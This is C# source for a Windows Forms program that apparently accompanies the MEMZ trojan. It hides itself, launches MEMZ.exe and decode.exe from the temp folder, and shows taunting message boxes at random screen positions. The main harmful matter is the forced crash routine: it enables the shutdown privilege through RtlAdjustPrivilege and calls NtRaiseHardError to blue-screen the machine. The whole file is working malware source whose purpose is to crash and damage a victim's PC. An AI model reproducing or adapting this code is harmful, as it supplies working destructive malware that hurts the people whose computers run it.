using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace Kill_MEMZ_to_bluescreen
{
    public partial class kill_memz_to_bluescreen : Form
    {
        private static uint STATUS_ASSERTION_FAILURE = 0xC0000350;

        string[] msgs = {
    "YOU KILLED MY TROJAN!\r\nNow you are going to die.",
    "REST IN PISS, FOREVER MISS.",
    "I WARNED YOU...",
    "HAHA N00B L2P G3T R3KT",
    "You failed at your 1337 h4x0r skillz.",
    "YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
    "HACKER!\r\nENJOY BAN!",
    "GET BETTER HAX NEXT TIME xD",
    "HAVE FUN TRYING TO RESTORE YOUR DATA :D",
    "|\\/|3|\\/|2",
    "BSOD INCOMING",
    "VIRUS PRANK (GONE WRONG)",
    "ENJOY THE NYAN CAT",
    "Get dank antivirus m9!",
    "You are an idiot!\r\nHA HA HA HA HA HA HA",
    "#MakeMalwareGreatAgain",
    "SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
    "Why did you even tried to kill MEMZ?\r\nYour PC is fucked anyway.",
    "SecureBoot sucks.",
    "gr8 m8 i r8 8/8",
    "Have you tried turning it off and on again?",
    "<Insert Joel quote here>",
    "Greetings to all GAiA members!",
    "Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!",
    "'This is everything I want in my computer'\r\n - danooct1 2016",
    "'Uh, Club Penguin. Time to get banned!'\r\n - danooct1 2016",
        };
        public kill_memz_to_bluescreen()
        {
            InitializeComponent();
        }
        private void kill_memz_to_bluescreen_Load(object sender, EventArgs e)
        {
            string temp = Path.GetTempPath();
            this.Hide();

            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = temp + "MEMZ.exe";
            p.SynchronizingObject = this;
            p.Exited += new EventHandler(p_Exited);
            p.EnableRaisingEvents = true;
            p.Start();
        }
        private void p_Exited(object sender, EventArgs e)
        {
            string temp = Path.GetTempPath();
            Process.Start(temp + "decode.exe");
            {
                bsod.Start();
                MsgBox.Start();
            }
        }
        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(
   int Privilege,
   bool bEnablePrivilege,
   bool IsThreadPrivilege,
   out bool PreviousValue
);
        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint ErrorStatus,
            uint NumberOfParameters,
            uint UnicodeStringParameterMask,
            IntPtr Parameters,
            uint ValidResponseOption,
            out uint Response
        );

        private void bsod_Tick(object sender, EventArgs e)
        {
            bsod.Stop();
            RtlAdjustPrivilege(19, true, false, out bool previousValue);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
        }

        public class MsgBox1
        {
            private IWin32Window m_ownerWindow = null;
            private IntPtr m_hHook = (IntPtr)0;
            /// <param name="owner"></param>
            /// <param name="messageBoxText"></param>
            /// <param name="caption"></param>
            /// <param name="button"></param>
            /// <param name="icon"></param>
            /// <returns></returns>
            public static DialogResult Show(
                IWin32Window owner,
                string messageBoxText,
                string caption,
                MessageBoxButtons button,
                MessageBoxIcon icon)
            {
                MsgBox1 mbox = new MsgBox1(owner);
                return mbox.Show(messageBoxText, caption, button, icon);
            }
            /// <summary>
            /// コンストラクタ
            /// </summary>
            /// <param name="window">親ウィンドウ</param>
            private MsgBox1(IWin32Window window)
            {
                m_ownerWindow = window;
            }

            /// <summary>
            /// メッセージボックスを表示する
            /// </summary>
            /// <param name="messageBoxText"></param>
            /// <param name="caption"></param>
            /// <param name="button"></param>
            /// <param name="icon"></param>
            /// <returns></returns>
            private DialogResult Show(
                string messageBoxText,
                string caption,
                MessageBoxButtons button,
                MessageBoxIcon icon)
            {
                // フックを設定する。
                IntPtr hInstance = WinAPI.GetWindowLong(m_ownerWindow.Handle, WinAPI.GWL_HINSTANCE);
                IntPtr threadId = WinAPI.GetCurrentThreadId();
                m_hHook = WinAPI.SetWindowsHookEx(WinAPI.WH_CBT, new WinAPI.HOOKPROC(HookProc), hInstance, threadId);

                return MessageBox.Show(m_ownerWindow, messageBoxText, caption, button, icon);
            }

            /// <summary>
            /// フックプロシージャ
            /// </summary>
            /// <param name="nCode"></param>
            /// <param name="wParam"></param>
            /// <param name="lParam"></param>
            /// <returns></returns>
            private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
            {

                if (nCode == WinAPI.HCBT_ACTIVATE)
                {
                    WinAPI.RECT rcForm = new WinAPI.RECT(0, 0, 0, 0);
                    WinAPI.RECT rcMsgBox = new WinAPI.RECT(0, 0, 0, 0);

                    WinAPI.GetWindowRect(m_ownerWindow.Handle, out rcForm);
                    WinAPI.GetWindowRect(wParam, out rcMsgBox);

                    //ランダムな位置を計算
                    Random random = new Random();
                    int x = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                    int y = random.Next(0, Screen.PrimaryScreen.Bounds.Height);

                    WinAPI.SetWindowPos(wParam, 0, x, y, 0, 0, WinAPI.SWP_NOSIZE | WinAPI.SWP_NOZORDER | WinAPI.SWP_NOACTIVATE);

                    IntPtr result = WinAPI.CallNextHookEx(m_hHook, nCode, wParam, lParam);

                    // フックを解除する。
                    WinAPI.UnhookWindowsHookEx(m_hHook);
                    m_hHook = (IntPtr)0;

                    return result;

                }
                else
                {
                    return WinAPI.CallNextHookEx(m_hHook, nCode, wParam, lParam);
                }
            }
        }
       

        private void Msg_Tick(object sender, EventArgs e)
        {
            Random random = new Random();
            uint nMsgs = (uint)msgs.Length;

            MsgBox1.Show(this, (string)msgs[random.Next() % nMsgs], "MEMZ", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}